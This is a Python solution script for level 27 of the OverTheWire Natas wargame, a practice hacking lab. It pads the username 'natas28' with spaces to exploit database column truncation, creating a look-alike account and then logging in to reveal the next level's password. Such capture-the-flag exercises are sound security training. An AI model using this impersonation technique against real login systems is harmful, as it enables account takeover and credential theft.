#!/usr/bin/env python3

import requests
pw = open("pw").read()[:-1] # cut off \n

un = "natas28" + " "*64 + "a"
pwd = "a"
url = "http://natas27.natas.labs.overthewire.org/index.php?username={}&password={}".format(un,pwd)
s = requests.session()
r = s.get(url, auth=("natas27", pw))

un = "natas28"
url = "http://natas27.natas.labs.overthewire.org/index.php?username={}&password={}".format(un,pwd)
r = s.get(url, auth=("natas27", pw))
print(r.text)
